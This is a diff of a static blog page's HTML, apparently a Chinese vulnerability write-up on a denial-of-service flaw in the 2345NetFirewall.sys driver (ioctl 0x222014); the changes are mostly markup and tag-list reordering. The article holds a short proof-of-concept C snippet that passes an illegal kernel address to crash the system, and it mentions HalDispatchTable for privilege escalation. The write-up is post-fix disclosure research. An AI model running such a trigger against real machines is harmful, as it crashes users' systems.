@@ -15,6 +15,7 @@
 <meta property="og:url" content="https://anhkgg.github.io/vul-2345-1/index.html">
 <meta property="og:site_name" content="Anhkgg&#39;Lab | Windows Kernel | Rootkit | Reverse Engineer | Expolit | 内核研究 | 逆向分析 | 漏洞分析挖掘">
 <meta property="og:description" content="概述已经快2个月了吧，已经忘了是什么原因突然搞起了驱动漏洞，反正就是很有兴致地想挖掘一下驱动漏洞。 在网上了解了基本的驱动漏洞挖掘方法，主要是通过ioctl接口进行挖掘，已经有很多相关fuzz工具了，比如ioctlbf、kDriver-Fuzzer等等。 kDriver-Fuzzer的作者k0keoyo在2017年收获了100多个CVE，很牛逼啊，这个已经2018年了，再来挖此种类型的驱动是不是已">
+<meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://wx2.sinaimg.cn/mw690/006mu4nKly1ft1gtchr61j30cl076jrb.jpg">
 <meta property="og:image" content="http://wx4.sinaimg.cn/mw690/006mu4nKly1ft1h1f0t5yj30jt05274h.jpg">
 <meta property="og:updated_time" content="2018-07-08T03:17:28.491Z">
@@ -183,7 +184,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>已经快2个月了吧，已经忘了是什么原因突然搞起了驱动漏洞，反正就是很有兴致地想挖掘一下驱动漏洞。</p>
-<p>在网上了解了基本的驱动漏洞挖掘方法，主要是通过ioctl接口进行挖掘，已经有很多相关fuzz工具了，比如<a href="https://github.com/N3mes1s/ioctlbf" target="_blank" rel="external">ioctlbf</a>、<a href="https://github.com/k0keoyo/kDriver-Fuzzer" target="_blank" rel="external">kDriver-Fuzzer</a>等等。</p>
+<p>在网上了解了基本的驱动漏洞挖掘方法，主要是通过ioctl接口进行挖掘，已经有很多相关fuzz工具了，比如<a href="https://github.com/N3mes1s/ioctlbf" target="_blank" rel="noopener">ioctlbf</a>、<a href="https://github.com/k0keoyo/kDriver-Fuzzer" target="_blank" rel="noopener">kDriver-Fuzzer</a>等等。</p>
 <p>kDriver-Fuzzer的作者k0keoyo在2017年收获了100多个CVE，很牛逼啊，这个已经2018年了，再来挖此种类型的驱动是不是已经晚了啊，心中苦涩啊。</p>
 <p>不过毕竟也写了几年驱动程序了，不搞搞怎么也说不过去啊，所以开始干！</p>
 <a id="more"></a>
@@ -193,7 +194,7 @@
 <p>好，前言胡扯差不多就到这里了，本系列将拿2345中几个典型的原因造成的安全漏洞进行一番分析，希望对和我一样的初学者有一定帮助。</p>
 <p>哦，当然，在连番联系2345客服催促之后，2345终于修复了所有漏洞，所以我才等到这个时候分享文章，分析一些细节应该对他们没什么影响了吧（不过，我可没有所有的都重新验证一遍，申明一下，大家不要拿来干坏事，出事了我概不负责！）</p>
 <h1 id="漏洞概况"><a href="#漏洞概况" class="headerlink" title="漏洞概况"></a>漏洞概况</h1><ul>
-<li>软件网址：<a href="http://safe.2345.cc/" target="_blank" rel="external">http://safe.2345.cc/</a></li>
+<li>软件网址：<a href="http://safe.2345.cc/" target="_blank" rel="noopener">http://safe.2345.cc/</a></li>
 <li>版本：v3.7 X86</li>
 </ul>
 <p>2345安全软件的驱动2345NetFirewall.sys在ioctl(0x00222014)接口处理中，对输入数据校验不严格，可构造数据中包含非法地址导致访问违例，然后bsod拒绝服务。</p>
@@ -205,7 +206,7 @@
 <p><img src="http://wx4.sinaimg.cn/mw690/006mu4nKly1ft1h1f0t5yj30jt05274h.jpg" alt="img"></p>
 <p>既然0不行，那么其他地址还是可以的嘛，比如某些内核地址0x80000000，或者nt!HalDispatchTable（某些提权方式使用的地址）。</p>
 <p>用下面的poc代码尝试了一下，bsod！</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">ctlcode = 0x222014;</div><div class="line">NETFW_IOCTL_222014 buf_222014 = &#123;0&#125;;</div><div class="line">buf_222014.size = 1;</div><div class="line">buf_222014.ptr = (DWORD*)0x80000000; //非法内核地址</div><div class="line">if(!DeviceIoControl(h, ctlcode, &amp;buf_222014, sizeof(NETFW_IOCTL_222014), &amp;buf_222014, sizeof(NETFW_IOCTL_222014), &amp;BytesReturned, NULL)) &#123;</div><div class="line">	printf(&quot;[-] DeviceIoControl %x error: %d\n&quot;, ctlcode, GetLastError());</div><div class="line">&#125;</div><div class="line"></div><div class="line">kd&gt; dd 80000000</div><div class="line">80000000  ???????? ???????? ???????? ????????</div><div class="line">80000010  ???????? ???????? ???????? ????????</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ctlcode = 0x222014;</span><br><span class="line">NETFW_IOCTL_222014 buf_222014 = &#123;0&#125;;</span><br><span class="line">buf_222014.size = 1;</span><br><span class="line">buf_222014.ptr = (DWORD*)0x80000000; //非法内核地址</span><br><span class="line">if(!DeviceIoControl(h, ctlcode, &amp;buf_222014, sizeof(NETFW_IOCTL_222014), &amp;buf_222014, sizeof(NETFW_IOCTL_222014), &amp;BytesReturned, NULL)) &#123;</span><br><span class="line">	printf(&quot;[-] DeviceIoControl %x error: %d\n&quot;, ctlcode, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kd&gt; dd 80000000</span><br><span class="line">80000000  ???????? ???????? ???????? ????????</span><br><span class="line">80000010  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure>
 <p>至此，该内核拒绝服务漏洞验证成功，替换未其他内核地址还是有希望提权的，这里不在深入研究。</p>
 <h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>看完整篇，其实知道该漏洞真的很明显，很弱B是吧。但是基于某些原因（门槛？漏洞价值？），内核驱动这方面受到的关注较少，所以被虐的少了，开发人员重视程度也不够，所以对于参数的校验上就没那么认真严谨了！所以留下了这种弱X的洞洞被我捡漏。</p>
 <p>当然，前面提到2345在3.6版本中已经被人干过，所以还是做了一定的工作的，除了加入了异常保护代码，对于ioctl接口调用也加入了一定的限制和校验。所以poc不是直接就调用接口就成功触发bsod的，而做了一定的前期工作来应对2345做的限制和保护。</p>
@@ -559,22 +560,6 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Windbg调试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">RPC</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">远程过程调用</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">aboutme</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">Anti-AntiVirus</a>
               </li>
              
@@ -588,6 +573,10 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">杀毒软件</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">aboutme</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -607,7 +596,15 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hctf</a>
+                <a href="javascript:void(0)" class="js-tag color4">Windbg调试</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">RPC</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">远程过程调用</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -620,6 +617,22 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">cookie</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">hctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">inject process</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -659,23 +672,11 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">inject process</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">IDAPro</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">IDC</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -708,6 +709,34 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">pyspider</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">libcurl</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">http</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">minihttp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">get_post_ajax</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">shellcode</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">IDAPython</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">畅言</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -751,30 +780,6 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">libcurl</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">http</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">minihttp</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">get_post_ajax</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">shellcode</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">IDAPython</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">v2ex</a>
               </li>
              
@@ -783,7 +788,11 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">畅言</a>
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -819,6 +828,18 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">vul</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">exploit</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">fuzz</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">FireEye</a>
               </li>
              
@@ -828,6 +849,14 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">FINSPY</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">upx</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">unpack</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -844,26 +873,6 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">mmc.exe</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">vul</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">exploit</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">fuzz</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">upx</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">unpack</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -899,14 +908,6 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">windows</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">APC</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">windbg</a>
               </li>
              
@@ -920,6 +921,14 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">win10</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">windows</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">APC</a>
               </li>
             
             <div class="clearfix"></div>
